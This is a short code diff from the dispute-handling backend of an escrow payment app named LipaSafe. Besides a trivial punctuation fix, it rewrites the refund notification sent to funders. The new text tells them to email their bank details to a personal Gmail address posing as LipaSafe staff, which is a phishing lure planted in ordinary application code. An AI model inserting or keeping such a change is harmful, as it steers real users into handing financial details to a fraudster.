@@ -540,7 +540,7 @@ const resolveDispute = async (req, res) => {
         }
       }
 
-      return res.status(200).json({ success: true, message: 'Dispute resolved — funder notified, funds remain frozen.' })
+      return res.status(200).json({ success: true, message: 'Dispute resolved  funder notified, funds remain frozen.' })
     }
 
     if (outcome === 'RELEASE_TO_WORKER') {
@@ -768,7 +768,7 @@ const requestRefundBankDetails = async (req, res) => {
     emitToUser(dispute.deal.funderId, 'refund_bank_details_requested', {
       disputeId: dispute.id,
       dealId:    dispute.dealId,
-      message:   'LipaSafe needs your bank details to process your refund'
+      message:   'LipaSafe needs your bank details to process your refund..you might also send the details via emails:chachasmartkid34@gmail.com-lipasafe staff for full refund'
     })
 
     await prisma.auditLog.create({
